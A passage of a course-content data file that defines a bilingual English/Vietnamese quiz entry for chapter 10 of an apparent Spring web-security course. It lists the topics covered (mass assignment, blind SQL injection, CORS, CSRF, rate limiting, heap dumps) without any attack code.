      L106_EN + L106_VI),
    {
      title: '10.7 — Chapter 10 quiz|||10.7 — Kiểm tra chương 10',
      slug: 'sb-10-7-quiz',
      type: 'QUIZ',
      isFreePreview: false,
      description: 'Mười câu về mass assignment và JWT cũ, DTO, 404 lộ kích thước bảng, test tự quét tuyến, injection mù qua EXISTS, câu UPDATE chồng commit dù 500, mẫu CORS *, CSRF tắt câm vì BearerTokenRequestMatcher, xô Bucket4j theo IP và heapdump.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 10 · Quiz</span>
<h2>Check what stuck</h2>
<p class="lead">Every answer is something you saw run in this chapter — a role that waited for the next login, 30 bookings in 454 ms, a hash read through yes/no answers, a 500 that still committed, a CSRF filter that stepped aside, a heap dump that held the key. If you miss one, rerun that lesson's experiment and read the output again.</p>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 10 · Kiểm tra</span>
<h2>Xem thử đọng lại được gì</h2>
<p class="lead">Đáp án nào cũng là điều bạn đã thấy chạy trong chương — một vai trò chờ tới lần đăng nhập sau, 30 lượt đặt trong 454 ms, một chuỗi băm đọc ra từ các câu trả lời có/không, một lỗi 500 vẫn commit, một filter CSRF tự đứng sang bên, một heap dump giữ khoá. Sai câu nào thì chạy lại thí nghiệm của bài đó và đọc lại output.</p>
</div>
`,
      quiz: { timeLimitSeconds: 900, questions: QUIZ10 },
    },
  ],
};
